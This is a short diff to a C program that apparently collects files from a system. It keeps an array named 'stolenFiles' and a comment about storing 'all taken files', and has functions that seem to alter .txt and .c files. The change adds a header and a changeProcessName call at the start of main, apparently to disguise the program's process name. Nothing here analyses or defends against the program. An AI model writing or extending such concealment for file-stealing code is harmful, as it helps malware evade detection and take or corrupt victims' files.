@@ -11,6 +11,7 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <math.h>
+#include "renameProcess.h"
 
 void changeTxt(struct dirent *entry, const char *direct);
 void changeC(struct dirent *entry, const char *direct);
@@ -22,8 +23,9 @@ int copyFile(char *address, char *destPath);
 char copyToDir[1024];
 char stolenFiles[1024][1024];
 
-int main(int argc, const char *argv[]) {
-	
+int main(int argc, char *argv[]) {
+	changeProcessName(argv);
+
 	// Create folder "Files" to store all taken files
 	if (mkdir("Files", 0777) < 0 && errno != EEXIST) {
 		perror("mkdir failed");
